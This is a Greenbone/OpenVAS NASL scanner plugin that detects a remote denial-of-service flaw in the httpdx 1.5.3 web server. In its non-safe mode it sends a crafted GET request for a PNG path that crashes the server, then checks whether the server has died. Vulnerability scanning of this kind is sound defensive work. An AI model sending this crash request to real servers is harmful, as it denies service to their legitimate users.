if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100525" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-03-11 12:36:18 +0100 (Thu, 11 Mar 2010)" );
	script_bugtraq_id( 38638 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "httpdx PNG File Handling Remote Denial of Service Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/38638" );
	script_xref( name: "URL", value: "http://sourceforge.net/projects/httpdx/" );
	script_category( ACT_MIXED_ATTACK );
	script_family( "Denial of Service" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "httpdx/banner" );
	script_tag( name: "summary", value: "The 'httpdx' program is prone to a denial-of-service vulnerbaility." );
	script_tag( name: "impact", value: "Remote attackers can exploit this issue to cause the server to stop
  responding, denying service to legitimate users." );
	script_tag( name: "affected", value: "httpdx 1.5.3, other versions may also be affected." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("version_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "httpdx/" )){
	exit( 0 );
}
if( safe_checks() ){
	version = eregmatch( pattern: "httpdx/([0-9.]+)", string: banner );
	if(isnull( version[1] )){
		exit( 0 );
	}
	if(version_is_equal( version: version[1], test_version: "1.5.3" )){
		security_message( port: port );
		exit( 0 );
	}
}
else {
	if(http_is_dead( port: port )){
		exit( 0 );
	}
	url = NASLString( "GET /res~httpdx.conf/image/php.png" );
	req = http_get( item: url, port: port );
	res = http_send_recv( port: port, data: req );
	if(http_is_dead( port: port )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 0 );

